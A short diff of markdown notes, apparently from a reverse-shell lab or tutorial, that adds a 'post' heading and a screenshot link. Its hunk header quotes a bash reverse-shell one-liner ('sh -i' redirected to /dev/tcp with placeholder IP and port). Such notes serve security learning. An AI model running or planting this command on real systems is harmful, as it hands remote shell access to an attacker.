@@ -26,3 +26,8 @@ sh -i >& /dev/tcp/<ip_address>/<port> 0>&1
 
 ![alt text](images/2_reverse_shell/image-2.png)
 ![alt text](images/2_reverse_shell/image-3.png)
+
+---
+
+## post
+![alt text](images/2_reverse_shell/image-4.png)
